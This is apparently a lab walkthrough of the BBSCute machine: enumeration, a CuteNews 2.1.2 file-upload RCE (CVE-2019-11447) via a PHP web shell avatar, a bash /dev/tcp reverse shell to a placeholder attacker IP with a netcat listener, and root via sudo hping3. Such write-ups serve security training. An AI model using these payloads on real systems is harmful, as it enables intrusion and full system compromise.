# 🛡️ BBSCute – Offensive Security Walkthrough

## 📌 Overview

This walkthrough demonstrates the exploitation of a vulnerable machine by leveraging **Remote Code Execution (RCE)** in CuteNews v2.1.2 and achieving **privilege escalation via SUID misconfiguration**.

The attack follows a structured penetration testing methodology:

* Enumeration
* Initial Foothold (RCE)
* Shell Stabilization
* Privilege Escalation

---

## 🎯 Objective

* Gain initial access to the target system
* Escalate privileges to root
* Capture user and root flags

---

## ⚠️ Disclaimer

This walkthrough is created for **educational purposes only**.
All techniques demonstrated were performed in a controlled lab environment.

---

## 🌐 Target Information

| Parameter          | Value                |
| ------------------ | -------------------- |
| Target IP          | 192.168.210.128      |
| Environment        | Linux (Debian-based) |
| Vulnerable Service | CuteNews v2.1.2      |

---

## 🔍 Phase 1: Enumeration

### 🔹 Nmap Scan

```bash id="nmap001"
nmap -v -Pn -A -sC -sV 192.168.210.128
```

### 🔑 Key Findings:

* Port 22 → SSH
* Port 80 → Apache (Web Server)
* Port 88 → Nginx
* POP3 Services enabled

👉 Web service identified as main attack vector.

---

### 🔹 Directory Enumeration

```bash id="gobu001"
gobuster dir -u http://192.168.210.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50
```

### 📌 Important Directories:

* `/uploads` ✅ (Critical)
* `/cdata`
* `/core`

👉 The `/uploads` directory indicated a possible file upload vulnerability.

---

## ⚡ Phase 2: Initial Foothold (RCE)

### 🔹 Vulnerability Identified

* Software: CuteNews 2.1.2
* Vulnerability: Authenticated File Upload → RCE
* CVE: CVE-2019-11447

### 🔹 Exploitation Approach

* Register a new user
* Upload malicious avatar containing PHP payload
* Execute payload via `/uploads` directory

### 🔹 Payload Concept

```php id="php001"
<?php system($_REQUEST['cmd']); ?>
```

👉 This enables remote command execution via web shell.

---

### 🔹 Result

* Successfully gained command execution on target
* Interactive shell obtained

---

## 🧩 Phase 3: Shell Stabilization

### 🔹 Reverse Shell

```bash id="rev001"
/bin/bash -i >& /dev/tcp/<attacker-ip>/1234 0>&1
```

### 🔹 Listener

```bash id="nc001"
nc -nvlp 1234
```

### 🔹 Upgrade Shell

```bash id="pty001"
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

👉 Achieved stable interactive shell as `www-data`.

---

## 🔐 Phase 4: Privilege Escalation

### 🔹 SUDO Permissions Check

```bash id="sudo001"
sudo -l
```

### 🔑 Finding:

```
(root) NOPASSWD: /usr/sbin/hping3
```

👉 Binary can be executed as root without password.

---

### 🔹 Exploitation (GTFOBins Technique)

```bash id="hp001"
/usr/sbin/hping3
```

Inside hping3 shell:

```bash id="hp002"
/bin/bash -p
```

👉 Root shell obtained successfully.

---

## 🏁 Flags Captured

| Type      | Location           |
| --------- | ------------------ |
| User Flag | /var/www/local.txt |
| Root Flag | /root/proof.txt    |

---

## 🧠 Key Takeaways

* Always check for **file upload vulnerabilities**
* Misconfigured **SUID binaries are critical escalation vectors**
* Proper enumeration leads to successful exploitation
* Tools like GTFOBins are essential for privilege escalation

---

## 🛠️ Tools Used

* Nmap
* Gobuster
* Netcat
* Searchsploit
* GTFOBins

---

## 🚀 Skills Demonstrated

* Web Exploitation (RCE)
* Linux Privilege Escalation
* Enumeration & Reconnaissance
* Reverse Shell Handling

---

## 📌 Conclusion

This lab highlights how a combination of:

* Weak file upload validation
* Misconfigured SUID permissions

can lead to full system compromise.

---

## 📄 Detailed Execution Logs

For complete command outputs and raw execution logs, refer to the full report:

📎 [Download Full Report](./Offsec_BBSCute.pdf)

---

## 👨‍💻 Author

Arhan Hussain

---
